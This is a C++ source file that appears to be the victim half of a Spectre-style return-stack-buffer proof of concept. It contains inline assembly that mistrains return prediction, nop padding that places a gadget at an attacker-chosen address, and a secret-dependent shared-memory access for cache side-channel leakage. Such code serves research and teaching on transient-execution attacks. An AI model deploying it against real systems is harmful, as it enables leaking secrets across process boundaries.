#include "util.hpp"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sched.h>

#define secret 3
char* array;

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
ADDR_PTR tmp;

using namespace std;

volatile int foo(){
	return 0;
}

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

volatile void spacer2() {
	asm(
		".rept 915;"
		"nop;"
		".endr;"
	);
}

void exploit();

void trickMe() {
	// while(1) {

	while(1) {
		// sched_yield();
		// exploit();
		asm(
			retAsm(1)
			retAsm(2)
			retAsm(3)
			retAsm(4)
			retAsm(5)
			retAsm(6)
			retAsm(7)
			retAsm(8)
			retAsm(9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
		);
	}
}

volatile void spacer() {
	asm(
		// ".rept 1000;"
		".rept 957;"
		"nop;"
		".endr;"
	);
}

void exploit() { 
	// this should be at the same VA as attacker:gadget()
	// volatile int temp = array[secret*offset];
	volatile int temp = array[secret*offset];
	// clflush((void*)(&array[secret*offset]));
}

int main(){
	printf("Preparing the memory space...");
	const int SIZE = 1<<20; 
	// shared memory is named Sally because Rob doesn't know anyone named Sally
    const char* name = "Sally";
    char temp;
    // shared memory file descriptor
    int shm_fd;  
    // pointer to shared memory obect
    // create the shared memory object
    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
    // configure the size of the shared memory object
    ftruncate(shm_fd, SIZE); 
    // memory map the shared memory object
    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0); 
	printf("Done!\n");

	// printf("Enter a secret (%d-%d):", lowerBound, upperBound);
	// scanf("%d", &secret);
	printf("Your secret is: %d\n", secret);
	
	printf("Running victim code...\n");
	// array[secret*offset] = 'Q';
	// printf("VA of secret is %p\n", (void *)&array[secret*offset]);
	trickMe();

	return 0;
}